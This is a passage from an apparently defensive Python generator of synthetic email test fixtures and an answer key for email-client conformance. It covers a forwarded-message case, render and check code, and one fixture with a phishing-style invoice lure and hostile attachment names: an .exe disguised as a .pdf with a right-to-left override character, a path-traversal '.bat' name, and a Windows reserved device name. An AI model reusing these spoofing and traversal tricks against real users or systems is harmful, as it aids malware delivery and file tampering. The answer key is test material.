Subject: Fwd: Customs clearance documents
Date: Wed, 11 Feb 2026 13:30:00 +0200
Message-ID: <20260211133000.018@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b018-mix"

--b018-mix
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Sara, forwarding the customs agent's message as an attachment.

--b018-mix
Content-Type: message/rfc822
Content-Disposition: attachment; filename="Customs clearance documents.eml"

From: Clearance Desk <desk@customs-agent.example>
To: Omar Farouk <omar.farouk@isupply.test>
Subject: Customs clearance documents
Date: Wed, 11 Feb 2026 13:00:00 +0200
Message-ID: <inner-018@customs-agent.example>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Dear Omar,
The clearance documents for shipment ALX-2026-0042 are ready for pickup.

--b018-mix--
""",
    description="Forward-as-attachment: message/rfc822 part. The inner message's body must not be "
                "mistaken for the outer body; clients show it as an attached email.",
    tags=["message-rfc822", "forward", "attachments"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    expect={
        "subject": "Fwd: Customs clearance documents",
        "normalized_subject": "Customs clearance documents",
        "body_preferred": "text/plain",
        "text_contains": ["forwarding the customs agent"],
        "attached_message_subjects": ["Customs clearance documents"],
        "attachments": [{"filename": "Customs clearance documents.eml", "content_type": "message/rfc822"}],
    },
)

_spoofed_019 = rfc2231("invoice-2026\u202efdp.exe")  # U+202E RIGHT-TO-LEFT OVERRIDE
fixture("019-attachment-filename-spoofing.eml", f"""\
From: "Accounts Payable" <ap@vendor-invoices.example>
To: accounts@isupply.test
Subject: {encoded_words("Overdue invoice — immediate payment required", "UTF-8", "Q")}
Date: Thu, 12 Feb 2026 06:30:00 +0200
Message-ID: <x019@vendor-invoices.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b019-mix"

--b019-mix
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Please see the attached invoice and pay today.

--b019-mix
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename*={_spoofed_019}

{b64(FAKE_EXE)}
--b019-mix
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="../../AppData/Roaming/evil.bat"

{b64(b"@echo synthetic fixture - not a real script")}
--b019-mix
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="CON.txt"

Windows reserved device name as a filename.

--b019-mix--
""",
    description="Hostile attachment names: RIGHT-TO-LEFT OVERRIDE disguising an .exe as .pdf, path "
                "traversal, a Windows reserved device name. SECURITY CONFORMANCE: clients must neutralize "
                "these before display or saving.",
    tags=["security", "attachments", "filename-spoofing", "bidi"],
    seed={"folder": "Junk", "flags": []},
    expect={
        "subject": "Overdue invoice — immediate payment required",
        "warnings_include": ["bidi_control_chars", "executable_extension", "path_traversal", "windows_reserved_name"],
    },
)

THREADS = [
    {
        "id": "cairo-delivery",
        "normalized_subject": "Delivery schedule for Cairo branch",
        "messages": ["008-thread-original.eml", "009-thread-reply.eml", "010-thread-reply-arabic-prefix.eml"],
        "note": "010 has In-Reply-To but no References; it must still join the thread.",
    }
]

EXPECT_KEYS_DOC = {
    "subject": "decoded, unfolded Subject (null if absent)",
    "normalized_subject": "subject with reply/forward prefixes (incl. Arabic) and [tags] removed",
    "from": "list of {name, address}; address lower-cased",
    "to / cc": "list of addresses (lower-cased); groups flattened; empty group -> []",
    "date": "Date header in UTC ISO-8601, or null if missing/unparseable",
    "message_id / in_reply_to / references": "angle-bracketed ids",
    "body_preferred": "text/html | text/plain | null — what the reader shows by default",
    "text_contains / html_contains": "substrings of the decoded text/plain resp. text/html body",
    "attachments": "ordered list; each item's listed keys must match (filename decoded, content_type, size in bytes)",
    "inline_parts": "ordered list of Content-IDs rendered inline (never listed as attachments)",
    "attached_message_subjects": "subjects of message/rfc822 attachments",
    "calendar": "{method, summary} of the text/calendar part",
    "html_dangerous_at_least": "risky HTML constructs that MUST be detected (and removed by the sanitizer)",
    "html_dangerous_none": "true if the HTML contains no risky constructs",
    "remote_resources / tracking_pixels": "counts of remote loads / 1x1 remote images in the HTML",
    "mismatched_links_min": "links whose visible URL host differs from the real href host",
    "defects_include": "parser defects that must be reported (Python email defect class names)",
    "warnings_include": "substrings of client warnings (e.g. attachment filename risks)",
}


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------


def render() -> Dict[str, bytes]:
    files: Dict[str, bytes] = {}
    for fx in FIXTURES:
        text = fx["text"]
        if fx["meta"]["line_endings"] == "crlf":
            text = text.replace("\r\n", "\n").replace("\n", "\r\n")
        files[fx["file"]] = text.encode("utf-8")

    existing: List[Dict[str, Any]] = []
    if MANIFEST.exists():
        existing = [f for f in json.loads(MANIFEST.read_text(encoding="utf-8")).get("fixtures", [])
                    if f.get("origin") != "synthetic"]
    entries = sorted([fx["meta"] for fx in FIXTURES] + existing, key=lambda f: f["file"])
    manifest = {
        "version": 1,
        "description": "Email fixture corpus + expected client-facing interpretation (conformance answer key). "
                       "Synthetic entries are generated by generate_synthetic.py; see README.md.",
        "expect_keys": EXPECT_KEYS_DOC,
        "fixtures": entries,
        "threads": THREADS,
    }
    files["manifest.json"] = (json.dumps(manifest, ensure_ascii=False, indent=2) + "\n").encode("utf-8")
    return files


def main(argv: List[str]) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--check", action="store_true", help="fail if committed files differ from generator output")
    ap.add_argument("--out", type=Path, default=HERE, help="output directory (default: this directory)")
    args = ap.parse_args(argv)

    files = render()
    if args.check:
        stale = [name for name, data in files.items()
                 if not (HERE / name).exists() or (HERE / name).read_bytes() != data]
        if stale:
            print("Out of date (run: python3 fixtures/email/generate_synthetic.py): " + ", ".join(stale), file=sys.stderr)
            return 1
        print(f"OK: {len(files) - 1} synthetic fixtures and manifest.json are current")
        return 0
    args.out.mkdir(parents=True, exist_ok=True)
    for name, data in files.items():
        (args.out / name).write_bytes(data)
    print(f"Wrote {len(files) - 1} fixtures + manifest.json to {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
